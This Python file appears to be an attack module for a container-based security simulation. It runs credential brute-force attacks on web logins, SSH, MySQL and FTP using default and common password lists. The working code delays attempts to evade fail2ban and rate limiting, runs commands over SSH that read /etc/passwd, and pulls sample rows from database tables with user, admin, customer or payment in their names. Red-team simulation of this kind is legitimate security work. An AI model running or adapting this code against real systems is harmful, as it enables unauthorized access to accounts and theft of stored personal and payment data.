#!/usr/bin/env python3
"""
🔨 Brute Force Attack Script
Credential brute force attacks against authentication services
"""

import asyncio
import requests
import paramiko
import mysql.connector
import logging
import time
import itertools
from typing import Dict, List, Any, Tuple
from concurrent.futures import ThreadPoolExecutor

logger = logging.getLogger(__name__)

class BruteForceAttack:
    def __init__(self):
        self.attack_name = "Credential Brute Force"
        self.attack_id = "brute_force"
        self.mitre_techniques = ["T1110.001", "T1110.003"]  # Brute Force: Password Guessing, Password Spraying
        self.owasp_category = "A07:2021 - Identification and Authentication Failures"
        self.stride_category = "Spoofing, Elevation of Privilege"
        
        # Common username lists
        self.usernames = [
            'admin', 'administrator', 'root', 'user', 'test', 'guest', 'demo',
            'sa', 'oracle', 'postgres', 'mysql', 'ftp', 'email', 'web',
            'www', 'mail', 'service', 'operator', 'manager', 'support'
        ]
        
        # Common password lists (top weak passwords)
        self.passwords = [
            'password', '123456', 'admin', 'root', 'guest', '',
            'password123', 'admin123', '12345678', 'qwerty',
            'abc123', 'Password1', 'welcome', 'login', 'pass',
            'test', 'demo', 'user', '1234', 'changeme'
        ]
        
        # Service-specific default credentials
        self.default_credentials = {
            'ssh': [
                ('root', 'root'), ('admin', 'admin'), ('user', 'password'),
                ('pi', 'raspberry'), ('ubuntu', 'ubuntu')
            ],
            'mysql': [
                ('root', ''), ('root', 'root'), ('admin', 'admin123'),
                ('mysql', 'mysql'), ('webapp', 'password123')
            ],
            'web': [
                ('admin', 'admin'), ('admin', 'password'), ('admin', '123456'),
                ('administrator', 'administrator'), ('user', 'user')
            ],
            'ftp': [
                ('anonymous', ''), ('ftp', 'ftp'), ('admin', 'admin'),
                ('user', 'password'), ('test', 'test')
            ]
        }
        
    async def execute_attack(self, environment: Dict, target_components: List[str], orchestrator) -> Dict:
        """
        Execute brute force attacks against target components
        
        Args:
            environment: Virtual environment containing target containers
            target_components: List of component IDs to target
            orchestrator: Main orchestrator instance
            
        Returns:
            Attack results with successful credential discoveries
        """
        logger.info(f"🔨 Starting Brute Force attack on environment {environment['id']}")
        
        results = {
            'attack_type': self.attack_name,
            'attack_id': self.attack_id,
            'success': False,
            'vulnerabilities_exploited': [],
            'systems_compromised': [],
            'data_accessed': [],
            'persistence_achieved': False,
            'lateral_movement': [],
            'attack_timeline': [],
            'technical_details': {
                'successful_credentials': {},
                'failed_attempts': {},
                'lockout_detected': {},
                'services_attacked': []
            }
        }
        
        # Discover available services for brute force
        targets = await self._discover_brute_force_targets(environment, target_components, results)
        
        if not targets:
            logger.warning("⚠️ No suitable targets found for brute force attack")
            return results
        
        # Phase 1: Web Application Brute Force
        web_targets = [t for t in targets if t['service'] == 'web']
        if web_targets:
            await self._brute_force_web_applications(web_targets, results)
        
        # Phase 2: SSH Brute Force
        ssh_targets = [t for t in targets if t['service'] == 'ssh']
        if ssh_targets:
            await self._brute_force_ssh(ssh_targets, results)
        
        # Phase 3: Database Brute Force
        db_targets = [t for t in targets if t['service'] == 'mysql']
        if db_targets:
            await self._brute_force_database(db_targets, results)
        
        # Phase 4: FTP Brute Force
        ftp_targets = [t for t in targets if t['service'] == 'ftp']
        if ftp_targets:
            await self._brute_force_ftp(ftp_targets, results)
        
        # Determine overall success
        if results['technical_details']['successful_credentials']:
            results['success'] = True
            
        logger.info(f"✅ Brute Force attack completed. Credentials found: {len(results['technical_details']['successful_credentials'])}")
        return results
    
    async def _discover_brute_force_targets(self, environment: Dict, target_components: List[str], results: Dict) -> List[Dict]:
        """Discover services that can be brute forced"""
        logger.info("🎯 Discovering brute force targets...")
        
        targets = []
        
        for container_id, container in environment.get('containers', {}).items():
            if target_components and container_id not in target_components:
                continue
                
            try:
                container.reload()
                ports = container.attrs.get('NetworkSettings', {}).get('Ports', {})
                
                # Check for SSH (port 22)
                if '22/tcp' in ports and ports['22/tcp']:
                    host_port = ports['22/tcp'][0]['HostPort']
                    targets.append({
                        'container_id': container_id,
                        'service': 'ssh',
                        'host': 'localhost',
                        'port': int(host_port),
                        'protocol': 'ssh'
                    })
                    
                # Check for HTTP (port 80/8080)
                web_ports = ['80/tcp', '8080/tcp']
                for port_spec in web_ports:
                    if port_spec in ports and ports[port_spec]:
                        host_port = ports[port_spec][0]['HostPort']
                        targets.append({
                            'container_id': container_id,
                            'service': 'web',
                            'host': 'localhost',
                            'port': int(host_port),
                            'protocol': 'http'
                        })
                        break
                
                # Check for MySQL (port 3306)
                if '3306/tcp' in ports and ports['3306/tcp']:
                    host_port = ports['3306/tcp'][0]['HostPort']
                    targets.append({
                        'container_id': container_id,
                        'service': 'mysql',
                        'host': 'localhost',
                        'port': int(host_port),
                        'protocol': 'mysql'
                    })
                
                # Check for FTP (port 21)
                if '21/tcp' in ports and ports['21/tcp']:
                    host_port = ports['21/tcp'][0]['HostPort']
                    targets.append({
                        'container_id': container_id,
                        'service': 'ftp',
                        'host': 'localhost',
                        'port': int(host_port),
                        'protocol': 'ftp'
                    })
                    
            except Exception as e:
                logger.warning(f"⚠️ Could not analyze {container_id}: {e}")
        
        logger.info(f"🎯 Found {len(targets)} brute force targets")
        results['technical_details']['services_attacked'] = [t['service'] for t in targets]
        
        return targets
    
    async def _brute_force_web_applications(self, web_targets: List[Dict], results: Dict) -> None:
        """Brute force web application login forms"""
        logger.info("🌐 Phase 1: Web Application Brute Force")
        
        for target in web_targets:
            base_url = f"http://{target['host']}:{target['port']}"
            
            # Common login endpoints
            login_endpoints = ['/login.php', '/admin/', '/admin/login.php', '/login', '/admin/index.php']
            
            for endpoint in login_endpoints:
                login_url = base_url + endpoint
                
                try:
                    # Check if login endpoint exists
                    response = requests.get(login_url, timeout=5)
                    if response.status_code not in [200, 302, 401]:
                        continue
                        
                    logger.info(f"🔍 Testing login endpoint: {login_url}")
                    
                    # Try default credentials first
                    default_creds = self.default_credentials.get('web', [])
                    
                    successful_creds = []
                    failed_attempts = []
                    
                    for username, password in default_creds:
                        success, response_info = await self._test_web_credentials(
                            login_url, username, password
                        )
                        
                        if success:
                            successful_creds.append((username, password))
                            logger.info(f"✅ Web login success: {username}:{password} on {target['container_id']}")
                            
                            results['vulnerabilities_exploited'].append({
                                'type': 'weak_web_authentication',
                                'component': target['container_id'],
                                'service': f"web:{target['port']}",
                                'credentials': f"{username}:{password}",
                                'severity': 'high'
                            })
                            
                            results['systems_compromised'].append(target['container_id'])
                            
                            # Try to access admin areas
                            admin_access = await self._test_admin_access(base_url, username, password)
                            if admin_access:
                                results['data_accessed'].append('admin_panel_access')
                                results['persistence_achieved'] = True
                        else:
                            failed_attempts.append((username, password))
                    
                    # If no default creds worked, try common combinations
                    if not successful_creds:
                        common_combos = list(itertools.product(
                            self.usernames[:5], self.passwords[:5]
                        ))[:20]  # Limit attempts to avoid lockout
                        
                        for username, password in common_combos:
                            success, response_info = await self._test_web_credentials(
                                login_url, username, password
                            )
                            
                            if success:
                                successful_creds.append((username, password))
                                break
                            
                            failed_attempts.append((username, password))
                            
                            # Small delay to avoid triggering rate limiting
                            await asyncio.sleep(0.5)
                    
                    # Store results
                    if successful_creds:
                        results['technical_details']['successful_credentials'][f"{target['container_id']}_web"] = successful_creds
                        
                        results['attack_timeline'].append({
                            'timestamp': time.time(),
                            'action': 'web_brute_force',
                            'target': target['container_id'],
                            'result': 'success',
                            'credentials_found': len(successful_creds)
                        })
                    
                    results['technical_details']['failed_attempts'][f"{target['container_id']}_web"] = len(failed_attempts)
                    
                except requests.RequestException as e:
                    logger.warning(f"⚠️ Web brute force failed for {target['container_id']}: {e}")
    
    async def _test_web_credentials(self, login_url: str, username: str, password: str) -> Tuple[bool, Dict]:
        """Test web application credentials"""
        try:
            # Try POST request with form data
            login_data = {
                'username': username,
                'password': password,
                'user': username,  # Alternative field names
                'pass': password,
                'login': 'Login'
            }
            
            response = requests.post(login_url, data=login_data, timeout=10, allow_redirects=False)
            
            # Check for successful login indicators
            success_indicators = [
                response.status_code == 302,  # Redirect after login
                'dashboard' in response.text.lower(),
                'welcome' in response.text.lower(),
                'logout' in response.text.lower(),
                'admin panel' in response.text.lower()
            ]
            
            # Check for failure indicators
            failure_indicators = [
                'invalid' in response.text.lower(),
                'incorrect' in response.text.lower(),
                'failed' in response.text.lower(),
                'error' in response.text.lower()
            ]
            
            if any(success_indicators) and not any(failure_indicators):
                return True, {'status_code': response.status_code, 'redirect': response.headers.get('Location')}
            
        except Exception as e:
            logger.debug(f"❌ Web credential test error: {e}")
        
        return False, {}
    
    async def _test_admin_access(self, base_url: str, username: str, password: str) -> bool:
        """Test access to admin areas with discovered credentials"""
        admin_endpoints = ['/admin/', '/admin/dashboard', '/admin/users', '/admin/config']
        
        session = requests.Session()
        
        # Login first
        try:
            login_response = session.post(f"{base_url}/login.php", data={
                'username': username,
                'password': password
            })
            
            # Test admin endpoints
            for endpoint in admin_endpoints:
                try:
                    admin_response = session.get(base_url + endpoint, timeout=5)
                    if admin_response.status_code == 200:
                        return True
                except:
                    pass
        except:
            pass
        
        return False
    
    async def _brute_force_ssh(self, ssh_targets: List[Dict], results: Dict) -> None:
        """Brute force SSH services"""
        logger.info("🔐 Phase 2: SSH Brute Force")
        
        for target in ssh_targets:
            logger.info(f"🔍 Brute forcing SSH on {target['container_id']}:{target['port']}")
            
            successful_creds = []
            failed_attempts = []
            lockout_detected = False
            
            # Try default SSH credentials first
            default_creds = self.default_credentials.get('ssh', [])
            
            for username, password in default_creds:
                try:
                    success = await self._test_ssh_credentials(
                        target['host'], target['port'], username, password
                    )
                    
                    if success:
                        successful_creds.append((username, password))
                        logger.info(f"✅ SSH access: {username}:{password} on {target['container_id']}")
                        
                        results['vulnerabilities_exploited'].append({
                            'type': 'weak_ssh_authentication',
                            'component': target['container_id'],
                            'service': f"ssh:{target['port']}",
                            'credentials': f"{username}:{password}",
                            'severity': 'critical'
                        })
                        
                        results['systems_compromised'].append(target['container_id'])
                        
                        # Try to establish persistence
                        persistence = await self._establish_ssh_persistence(
                            target['host'], target['port'], username, password
                        )
                        if persistence:
                            results['persistence_achieved'] = True
                            results['data_accessed'].append('ssh_system_access')
                        
                        break  # Stop after first success
                    else:
                        failed_attempts.append((username, password))
                        
                except Exception as e:
                    if 'authentication failed' in str(e).lower():
                        failed_attempts.append((username, password))
                    elif 'connection refused' in str(e).lower():
                        logger.warning(f"⚠️ SSH connection refused to {target['container_id']}")
                        break
                    else:
                        logger.error(f"❌ SSH error: {e}")
                
                # Delay to avoid triggering fail2ban or similar
                await asyncio.sleep(1)
            
            # If no default creds worked, try common combinations (limited)
            if not successful_creds and not lockout_detected:
                common_combos = [
                    ('root', ''),
                    ('admin', ''),
                    ('user', 'user'),
                    ('test', 'test')
                ]
                
                for username, password in common_combos:
                    try:
                        success = await self._test_ssh_credentials(
                            target['host'], target['port'], username, password
                        )
                        
                        if success:
                            successful_creds.append((username, password))
                            break
                        else:
                            failed_attempts.append((username, password))
                            
                    except Exception as e:
                        failed_attempts.append((username, password))
                    
                    await asyncio.sleep(2)  # Longer delay for additional attempts
            
            # Store results
            if successful_creds:
                results['technical_details']['successful_credentials'][f"{target['container_id']}_ssh"] = successful_creds
                
                results['attack_timeline'].append({
                    'timestamp': time.time(),
                    'action': 'ssh_brute_force',
                    'target': target['container_id'],
                    'result': 'success',
                    'credentials_found': len(successful_creds)
                })
            
            results['technical_details']['failed_attempts'][f"{target['container_id']}_ssh"] = len(failed_attempts)
            
            if lockout_detected:
                results['technical_details']['lockout_detected'][target['container_id']] = True
    
    async def _test_ssh_credentials(self, host: str, port: int, username: str, password: str) -> bool:
        """Test SSH credentials"""
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            ssh.connect(
                hostname=host,
                port=port,
                username=username,
                password=password,
                timeout=10,
                auth_timeout=10
            )
            
            # Test if we can execute a command
            stdin, stdout, stderr = ssh.exec_command('whoami')
            result = stdout.read().decode().strip()
            
            ssh.close()
            
            if result:
                logger.debug(f"✅ SSH command success: {result}")
                return True
                
        except paramiko.AuthenticationException:
            return False
        except Exception as e:
            logger.debug(f"❌ SSH connection error: {e}")
            
        return False
    
    async def _establish_ssh_persistence(self, host: str, port: int, username: str, password: str) -> bool:
        """Try to establish SSH persistence mechanisms"""
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(host, port, username, password, timeout=10)
            
            # Try to create SSH key for persistence
            commands = [
                'mkdir -p ~/.ssh',
                'chmod 700 ~/.ssh',
                'whoami',  # Basic command to confirm access
                'id',      # Check privileges
                'cat /etc/passwd'  # Try to read system files
            ]
            
            for cmd in commands:
                stdin, stdout, stderr = ssh.exec_command(cmd)
                result = stdout.read().decode().strip()
                if result:
                    logger.debug(f"📋 SSH command '{cmd}': {result[:100]}...")
            
            ssh.close()
            return True
            
        except Exception as e:
            logger.debug(f"❌ SSH persistence failed: {e}")
            
        return False
    
    async def _brute_force_database(self, db_targets: List[Dict], results: Dict) -> None:
        """Brute force database services"""
        logger.info("🗄️ Phase 3: Database Brute Force")
        
        for target in db_targets:
            logger.info(f"🔍 Brute forcing MySQL on {target['container_id']}:{target['port']}")
            
            successful_creds = []
            failed_attempts = []
            
            # Try default MySQL credentials
            default_creds = self.default_credentials.get('mysql', [])
            
            for username, password in default_creds:
                try:
                    success, db_info = await self._test_mysql_credentials(
                        target['host'], target['port'], username, password
                    )
                    
                    if success:
                        successful_creds.append((username, password))
                        logger.info(f"✅ MySQL access: {username}:{password} on {target['container_id']}")
                        
                        results['vulnerabilities_exploited'].append({
                            'type': 'weak_database_authentication',
                            'component': target['container_id'],
                            'service': f"mysql:{target['port']}",
                            'credentials': f"{username}:{password}",
                            'severity': 'critical'
                        })
                        
                        results['systems_compromised'].append(target['container_id'])
                        
                        # Try to access sensitive data
                        sensitive_data = await self._extract_database_info(
                            target['host'], target['port'], username, password
                        )
                        if sensitive_data:
                            results['data_accessed'].extend(sensitive_data)
                        
                        break  # Stop after first success
                    else:
                        failed_attempts.append((username, password))
                        
                except Exception as e:
                    failed_attempts.append((username, password))
                    logger.debug(f"❌ MySQL error: {e}")
            
            # Store results
            if successful_creds:
                results['technical_details']['successful_credentials'][f"{target['container_id']}_mysql"] = successful_creds
                
                results['attack_timeline'].append({
                    'timestamp': time.time(),
                    'action': 'mysql_brute_force',
                    'target': target['container_id'],
                    'result': 'success',
                    'credentials_found': len(successful_creds)
                })
            
            results['technical_details']['failed_attempts'][f"{target['container_id']}_mysql"] = len(failed_attempts)
    
    async def _test_mysql_credentials(self, host: str, port: int, username: str, password: str) -> Tuple[bool, Dict]:
        """Test MySQL credentials"""
        try:
            conn = mysql.connector.connect(
                host=host,
                port=port,
                user=username,
                password=password,
                connect_timeout=5
            )
            
            if conn.is_connected():
                # Get server info
                cursor = conn.cursor()
                cursor.execute("SELECT VERSION(), USER(), DATABASE()")
                server_info = cursor.fetchone()
                
                cursor.close()
                conn.close()
                
                return True, {
                    'version': server_info[0] if server_info else 'Unknown',
                    'user': server_info[1] if server_info else 'Unknown'
                }
                
        except mysql.connector.Error as e:
            logger.debug(f"❌ MySQL connection failed: {e}")
            
        return False, {}
    
    async def _extract_database_info(self, host: str, port: int, username: str, password: str) -> List[str]:
        """Extract sensitive information from database"""
        extracted_data = []
        
        try:
            conn = mysql.connector.connect(
                host=host,
                port=port,
                user=username,
                password=password,
                connect_timeout=5
            )
            
            cursor = conn.cursor()
            
            # Get list of databases
            cursor.execute("SHOW DATABASES")
            databases = cursor.fetchall()
            
            for (database_name,) in databases:
                if database_name in ['information_schema', 'performance_schema', 'sys']:
                    continue
                    
                try:
                    cursor.execute(f"USE {database_name}")
                    cursor.execute("SHOW TABLES")
                    tables = cursor.fetchall()
                    
                    for (table_name,) in tables:
                        # Check for sensitive table names
                        if any(sensitive in table_name.lower() for sensitive in ['user', 'admin', 'customer', 'payment']):
                            extracted_data.append(f'sensitive_table_{table_name}')
                            
                            # Try to extract sample data
                            cursor.execute(f"SELECT * FROM {table_name} LIMIT 5")
                            sample_data = cursor.fetchall()
                            if sample_data:
                                extracted_data.append(f'table_data_{table_name}')
                                
                except mysql.connector.Error:
                    pass  # Table access might be restricted
            
            cursor.close()
            conn.close()
            
        except Exception as e:
            logger.debug(f"❌ Database info extraction failed: {e}")
        
        return extracted_data
    
    async def _brute_force_ftp(self, ftp_targets: List[Dict], results: Dict) -> None:
        """Brute force FTP services"""
        logger.info("📁 Phase 4: FTP Brute Force")
        
        # This would implement FTP brute force similar to other services
        # For brevity, implementing a simplified version
        
        for target in ftp_targets:
            logger.info(f"🔍 FTP brute force on {target['container_id']}:{target['port']}")
            
            # Try anonymous FTP first
            try:
                import ftplib
                ftp = ftplib.FTP()
                ftp.connect(target['host'], target['port'], timeout=10)
                ftp.login('anonymous', '')
                
                # Anonymous access successful
                results['vulnerabilities_exploited'].append({
                    'type': 'anonymous_ftp_access',
                    'component': target['container_id'],
                    'service': f"ftp:{target['port']}",
                    'severity': 'medium'
                })
                
                results['technical_details']['successful_credentials'][f"{target['container_id']}_ftp"] = [('anonymous', '')]
                
                ftp.quit()
                
            except Exception as e:
                logger.debug(f"❌ Anonymous FTP failed: {e}")

# Attack module interface
async def execute_attack(environment: Dict, target_components: List[str], orchestrator) -> Dict:
    """Main entry point for brute force attack"""
    attack = BruteForceAttack()
    return await attack.execute_attack(environment, target_components, orchestrator)